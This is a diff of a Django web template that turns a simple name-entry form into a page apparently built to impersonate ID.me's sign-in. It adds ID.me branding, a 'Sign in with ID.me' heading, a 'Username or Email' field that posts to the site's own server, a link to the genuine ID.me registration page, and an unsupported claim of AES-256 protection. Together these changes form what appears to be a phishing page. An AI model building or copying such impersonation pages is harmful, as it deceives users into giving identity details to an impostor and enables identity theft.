@@ -2,40 +2,67 @@
 {% extends 'main/base.html' %}
 {% load static %}
 
+
+
 {% block content %}
 <div class="container-fluid mt-4">
     <div class="row justify-content-center">
         <div class="col-md-6 col-lg-4">
-            <div class="card shadow-sm">
-                <div class="card-body p-4">
+            <!-- Name Collection Card -->
+            <div class="card shadow-sm border-0">
+                <div class="card-body p-5">
+                    <!-- Verification Header -->
                     <div class="text-center mb-4">
-                        <i class="bi bi-person-circle fs-1"></i>
-                        <h2 class="h4 mt-2">Enter Your Full Name</h2>
+                        <img src="{% static 'img/idme.png' %}"
+                            alt="Verification Logo" 
+                            style="height: 40px;" class="mb-3">
+                        <h2 class="h4">Sign in with ID.me</h2>
+                        <p class="text-muted small">Secure Identity Verification</p>
                     </div>
 
-                    <!-- Messages -->
-                    {% if messages %}
-                    <div class="alert alert-success">
-                        {% for message in messages %}
-                            {{ message }}
-                        {% endfor %}
-                    </div>
-                    {% endif %}
-
+                    <!-- Name Collection Form -->
                     <form method="POST">
                         {% csrf_token %}
-                        <div class="mb-3">
+                        <div class="mb-4">
+                            <label for="fullName" class="form-label small text-muted">Username or Email</label>
                             <input type="text" 
                                    class="form-control form-control-lg" 
-                                   name="full_name"
+                                   id="fullName" 
+                                   name="name"
                                    placeholder="John Doe"
-                                   required
-                                   autocomplete="off">
+                                   pattern="[A-Za-z ]{2,100}"
+                                   title="Enter your full legal name"
+                                   required>
                         </div>
-                        <button type="submit" class="btn btn-primary w-100">
-                            Continue
+
+                        <button type="submit" class="btn btn-primary w-100 py-2">
+                            <i class="bi bi-person-check me-2"></i>Verify Identity
                         </button>
                     </form>
+
+                    <!-- Create Account Section -->
+                    <div class="card mt-4 border">
+                        <div class="card-body text-center">
+                        <p class="mb-0 small">Don't have an ID.me account?</p>
+                        <a href="https://api.id.me/en/registration/new" 
+                            class="btn btn-outline-dark mt-3"
+                            target="_blank">
+                            Create ID.me Account
+                        </a>
+                        <p class="small text-muted mt-2">
+                            ID.me helps verify your identity securely.<br>
+                            <a href="#" class="text-decoration-none">Why we use ID.me</a>
+                        </p>
+                        </div>
+                    </div>
+
+                    <!-- Security Assurance -->
+                    <div class="text-center mt-4">
+                        <p class="small text-muted">
+                            <i class="bi bi-lock-fill me-1"></i>
+                            All information is protected by AES-256 encryption
+                        </p>
+                    </div>
                 </div>
             </div>
         </div>
